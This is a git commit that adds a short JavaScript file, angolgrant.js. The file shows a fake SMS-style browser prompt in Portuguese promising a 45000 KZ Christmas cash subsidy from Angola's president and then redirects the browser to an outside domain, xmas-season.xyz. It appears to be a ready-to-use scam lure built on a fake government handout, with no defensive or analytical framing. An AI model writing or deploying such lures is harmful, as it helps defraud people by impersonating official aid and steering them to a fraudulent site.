0392d7b2658156f85f375d5b279ded43f3405a71
bigetijazz14 <bigetijazz14@gmail.com>
2024-12-07 19:35:55 -0800

    Create angolgrant.js

---
+++ angolgrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMAÇÃO 45000 KZ'
+password=prompt('SMS: Parabéns, é elegível para JOÃO LOURENÇO 45000 KZ SUBSÍDIO EM DINHEIRO DE NATAL PARA TODOS, Por favor pressione OK para RECLAMAÇÃO Prémio em Dinheiro','RECLAMAÇÃO 45000 KZ');
+if (password != 'RECLAMAÇÃO 45000 KZ') {
+location.href='https://www.xmas-season.xyz/retirar-45000KZ';
+}
